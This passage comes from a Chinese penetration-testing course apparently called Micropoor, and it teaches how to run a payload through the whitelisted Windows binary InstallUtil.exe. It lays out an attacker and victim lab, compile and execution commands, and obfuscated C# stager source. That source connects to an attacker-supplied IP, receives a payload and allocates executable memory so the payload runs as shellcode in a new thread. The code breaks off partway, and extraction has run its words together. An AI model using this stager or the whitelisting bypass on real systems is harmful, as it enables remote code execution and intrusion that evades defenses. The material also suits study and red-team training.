7. 
8.
9. 
10.
11. 
18.
19. 
20.
21. 
22.
23. 
94.
95. 
96.
97. 
98.
99. 
100.
101. 
Micropoor
第七十一课：基于白名单Msbuild.exe执行payload第一季
-470-
本文档使用书栈(BookStack.CN)构建
Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服
务器资源。此工具与System.Configuration.Install命名空间中的类一起使用。
具体参考：WindowsInstaller部署
https://docs.microsoft.com/zh-cn/previous-versions/2kt85ked(v=vs.120)
说明：Installutil.exe所在路径没有被系统添加PATH环境变量中，因此，Installutil命令无法
识别。
基于白名单installutil.exe配置payload：
Windows7默认位置：
1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
攻击机：192.168.1.4Debian
靶机：192.168.1.3Windows7
Installutil简介：
配置攻击机msf：
靶机执行：
第七十二课：基于白名单Installutil.exe执行payload第二季
-471-
本文档使用书栈(BookStack.CN)构建
1. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe/r:System.Ente
rpriseServices.dll/r:System.IO.Compression.dll/target:library/out:Mic
opoor.exe/keyfile:C:\Users\John\Desktop\installutil.snk/unsafe
C:\Users\John\Desktop\installutil.cs
payload：
Micropoor.exe
靶机编译：
第七十二课：基于白名单Installutil.exe执行payload第二季
-472-
本文档使用书栈(BookStack.CN)构建
靶机执行：
1. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe/logfile=
/LogToConsole=false/UMicropoor.exe
第七十二课：基于白名单Installutil.exe执行payload第二季
-473-
本文档使用书栈(BookStack.CN)构建
注：x64payload
1. usingSystem;usingSystem.Net;usingSystem.Linq;usingSystem.Net.Sockets;
usingSystem.Runtime.InteropServices;usingSystem.Threading;using
System.Configuration.Install;usingSystem.Windows.Forms;
2.
3. publicclassGQLBigHgUniLuVx{
4.
5. publicstaticvoidMain()
6.
7. {
8.
9. while(true)
10.
11. {{MessageBox.Show("doge");Console.ReadLine();}}
12.
13. }
14.
15. }
16.
附录：Micropoor.cs
第七十二课：基于白名单Installutil.exe执行payload第二季
-474-
本文档使用书栈(BookStack.CN)构建
17. [System.ComponentModel.RunInstaller(true)]
18.
19. publicclassesxWUYUTWShqW:System.Configuration.Install.Installer
20.
21. {
22.
23. publicoverridevoidUninstall(System.Collections.IDictionaryzWrdFAUHmunnu)
24.
25. {
26.
27. jkmhGrfzsKQeCG.LCIUtRN();
28.
29. }
30.
31. }
32.
33. publicclassjkmhGrfzsKQeCG
34.
35. {[DllImport("kernel32")]privatestaticexternUInt32VirtualAlloc(UInt32
YUtHhF,UInt32VenifEUR,UInt32NIHbxnOmrgiBGL,UInt32KIheHEUxhAfOI);
36.
37. [DllImport("kernel32")]privatestaticexternIntPtrCreateThread(UInt32
GDmElasSZbx,UInt32rGECFEZG,UInt32UyBSrAIp,IntPtrsPEeJlufmodo,UInt32
jmzHRQU,refUInt32SnpQPGMvDbMOGmn);
38.
39. [DllImport("kernel32")]privatestaticexternUInt32WaitForSingleObject(IntPtr
pRIwbzTTS,UInt32eRLAWWYQnq);
40.
41. staticbyte[]ErlgHH(stringZwznjBJY,intKsMEeo){
42.
43. IPEndPointqAmSXHOKCbGlysd=newIPEndPoint(IPAddress.Parse(ZwznjBJY),KsMEeo);
44.
45. SocketXXxIoIXNCle=newSocket(AddressFamily.InterNetwork,SocketType.Stream,
ProtocolType.Tcp);
46.
47. try{XXxIoIXNCle.Connect(qAmSXHOKCbGlysd);}
48.
49. catch{returnnull;}
50.
51. byte[]UmquAHRnhhpuE=newbyte[4];
52.
53. XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);
第七十二课：基于白名单Installutil.exe执行payload第二季
-475-
本文档使用书栈(BookStack.CN)构建
54.
55. intkFVRSNnpj=BitConverter.ToInt32(UmquAHRnhhpuE,0);
56.
57. byte[]qaYyFq=newbyte[kFVRSNnpj+5];
58.
59. intSRCDELibA=0;
60.
61. while(SRCDELibA<kFVRSNnpj)
62.
63. {SRCDELibA+=XXxIoIXNCle.Receive(qaYyFq,SRCDELibA+5,(kFVRSNnpj‐
SRCDELibA)<4096?(kFVRSNnpj‐SRCDELibA):4096,0);}
64.
65. byte[]TvvzOgPLqwcFFv=BitConverter.GetBytes((int)XXxIoIXNCle.Handle);
66.
67. Array.Copy(TvvzOgPLqwcFFv,0,qaYyFq,1,4);qaYyFq[0]=0xBF;
68.
69. returnqaYyFq;}
70.
71. staticvoidcmMtjerv(byte[]HEHUjJhkrNS){
72.
73. if(HEHUjJhkrNS!=null){
74.
75. UInt32WcpKfU=VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);